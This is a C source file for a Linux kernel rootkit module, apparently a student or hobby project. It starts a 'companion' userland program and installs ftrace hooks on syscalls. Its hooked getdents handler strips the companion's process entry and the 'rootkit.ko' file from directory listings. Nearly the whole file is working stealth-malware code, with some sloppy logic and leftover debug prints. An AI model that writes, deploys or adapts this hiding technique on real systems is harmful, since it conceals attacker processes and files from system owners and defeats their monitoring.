#include "hide.h"

void launch_companion(void) {
    char *argv[] = {"/start_companion", NULL};
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (r) {
      printk(KERN_INFO "Companion launched\n");
    }
}

void get_pid_companion(void) {
    struct task_struct *task;
    pid_t pid_buff = -1;
    printk(KERN_INFO "PLEASE");
    for_each_process(task) {
      if (!strcmp(task->comm, "/bin/companion")) {
        g_pid_companion = task->pid;
        printk(KERN_INFO "PLEASE2");
        break ;
      }
      pid_buff = task->pid;
    }
}




static int find_sys_call_addr(t_ftrace_hook *hook) {
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "Failed to find syscall table\n");
        return 1;
    }
    *((unsigned long*) hook->original) = hook->address;
    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    t_ftrace_hook *hook = container_of(ops, t_ftrace_hook, ops);

    if(!within_module(parent_ip, THIS_MODULE))
        ((struct pt_regs *)(regs))->ip = (unsigned long) hook->function;
}

int fh_install_hook(t_ftrace_hook *hook)
{
    int err;
    err = find_sys_call_addr(hook);
    if(err)
        return err;
    /* For many of function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_INFO "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_INFO "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

void fh_remove_hook(t_ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}


/*
 * di -> FD
 * si -> struct dirent
 * dx -> count, taille de buffer %di
*/

static inline int is_digit(int c) {
    return (c >= '0' && c <= '9');
}


static bool is_numeric(char *str) {
  int i = 0;
  while (str[i] && is_digit(str[i])) {
    i++;
  }
  return (i == strlen(str));
}

asmlinkage long myGetDents(const struct pt_regs *regs) {

    // printk(KERN_INFO "Hello there\n");
    int dirent_idx = 0;
    int buff_pid = -1;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64* dirent_buff;
//  long int          count = regs->dx;
//  long unsigned int fd = regs->di;

    int getdent_ret = g_original_getdents(regs);

    if (getdent_ret <= 0) 
        return getdent_ret;
    
    void *dbuf = (void *)(dirent);
  //array of "string to hide"
    char *string_to_hide[] = {"rootkit.ko", NULL};
    int to_hide = 0;

    while (dirent_idx + to_hide< getdent_ret) {
      dirent_buff = (struct linux_dirent64 *)(dbuf + dirent_idx);
      int i = 0;
      if (is_numeric(dirent_buff->d_name)) {
        buff_pid = (int)simple_strtol(dirent_buff->d_name, NULL, 10);
        if (buff_pid == g_pid_companion) {
            to_hide += dirent_buff->d_reclen;
            // So if we match, we just copy the next dirent_struct list until the end to the current one, so, it remove the chain link
            memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
        }
      } else {
        while (string_to_hide[i] != NULL) {
          if (strstr(dirent_buff->d_name, string_to_hide[i]) != NULL) {
            to_hide += dirent_buff->d_reclen;
            // So if we match, we just copy the next dirent_struct list until the end to the current one, so, it remove the chain link
            memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
            break ;
          }
          i++;
        }
      }
    if (string_to_hide[i] == NULL || buff_pid != g_pid_companion) {
      // We increment only when it's not a match
      dirent_idx += dirent_buff->d_reclen;
    }
  }

    /*
   printf("%-10s ", (d_type == DT_REG) ?  "regular" :
   (d_type == DT_DIR) ?  "directory" :
   (d_type == DT_FIFO) ? "FIFO" :
   (d_type == DT_SOCK) ? "socket" :
   (d_type == DT_LNK) ?  "symlink" :
   (d_type == DT_BLK) ?  "block dev" :
   (d_type == DT_CHR) ?  "char dev" : "???");
    */
	  return dirent_idx;
}
